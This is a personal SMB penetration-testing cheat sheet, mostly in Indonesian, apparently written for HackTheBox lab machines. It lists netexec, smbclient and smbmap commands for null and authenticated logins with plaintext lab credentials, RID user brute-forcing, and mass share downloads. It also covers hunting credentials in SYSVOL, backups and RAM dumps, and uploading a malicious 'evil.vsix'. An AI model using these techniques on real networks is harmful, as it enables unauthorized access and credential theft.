SMB itu seperti **"Google Drive versi LAN"** — kamu bisa akses file di komputer lain seolah-olah ada di lokal.

# 0. Automation
```shell
modes=(
"--rid-brute"
"--shares"
"-M|spider_plus"
)

for entry in "${modes[@]}"; do
  IFS='|' read -r flag arg <<< "$entry"
  echo "=== $flag $arg =="
  nxc smb 10.129.27.241 -u "anderson.w" -p "R3dT3am@Acc3ss#01" $flag $arg
  echo ""
done
```
# 1. Login
## a. Null Session
```shell
smbclient -L //10.129.27.241/ -N
smbclient //10.129.27.241/NETLOGON -N
smbclient //10.129.27.241/SYSVOL -N

nxc smb 10.129.244.81 -u '' -p ''

smbmap -H 10.129.244.81 -u Guest -p ''
```

## b. Authenticated Session
```shell
nxc smb danglingtree.htb -u 'anderson.w' -p 'R3dT3am@Acc3ss#01' --shares 
```

# 2. Explore 
## a. Shares
cari sensitif file yang extensionnnya .config atau exe, cari terbuat dari apa lalu decompile file tersebut, grep password, kalau dapat credential gas login smb dengan creds itu

kalau SYSVOL dan NETLOGON pada SMB, dipastikan mesin tersebut adalah Domain Controller, cek share itu dulu.
```shell
# Show semua file dalam masing2 share
nxc smb danglingtree.htb -u 'anderson.w' -p 'R3dT3am@Acc3ss#01' -M spider_plus
smbmap -H danglingtree.htb -u 'anderson.w' -p 'R3dT3am@Acc3ss#01' -r | tee smbmap.txt #lebih lengkap

#untuk null session
smbclient //10.129.244.81/<share> -N

#untuk authenticated session
smbclient //danglingtree.htb/IPC$ -U anderson.w
smbmap -H garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t\!@1978' -r SYSVOL/file
smbmap -H garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' -r 'SYSVOL' --depth 7

#download semuanya
smbclient //10.129.244.81/<share> -U username 
recurse ON
prompt OFF
mget *

#alternative kalau smblient tidak bisa
smbmap -H garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t\!@1978' --download './SYSVOL/printerDetect.bat'

# Downloda semuanyanya, tapi kadang kosong
smbmap -H garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -r -A '.*'
```

### i.  VMBackups
- Cek `.vmem` 
  karena itu RAM dump — tempat LSASS hidup dan menyimpan credential. Gunakan `vol` (Kalau filenya kecil) untuk di luar shell windows atau gunakan `vmkatz` (jika file terlalu besar untuk di download) untuk di dalam shell
### ii. WSUS
### iii. LOGS
### iv. SYSVOL
- scripts -> kalau bisa put -> scriptPath vulnerability

## b. List User
```shell
# jika nama ada akhiran $, berarti itu adalah computer account  
nxc smb danglingtree.htb -u 'anderson.w' -p 'R3dT3am@Acc3ss#01' --rid-brute | grep -i 'sidtypeuser' | grep -io '\\.* ' | tr -d '\\' | tee users.txt
```

# 3 Upload
```shell
smbclient //10.129.28.66/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c "put evil.vsix evil.vsix"
```


